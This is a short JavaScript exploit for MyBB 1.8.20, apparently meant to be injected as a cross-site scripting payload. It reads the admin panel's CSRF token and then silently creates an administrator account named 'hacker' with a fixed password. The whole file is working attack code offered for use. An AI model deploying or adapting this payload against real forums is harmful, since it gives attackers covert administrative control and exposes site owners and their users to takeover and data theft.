/*
mybb - adds administrator with username hacker and password hacker12345
tested on latest version of mybb v1.8.20
original script by hakluke modified by mqt
*/
var mybb_root = "" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = mybb_root + "/admin/index.php?module=user-users&action=add";
var regex = /my_post_key" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send(); 
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "my_post_key="+nonce+"&username=hacker&password=hacker12345&confirm_password=hacker12345&email=hacker@hacker.com&usergroup=4&displaygroup=0"; //make sure passwod is 6+ chars
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
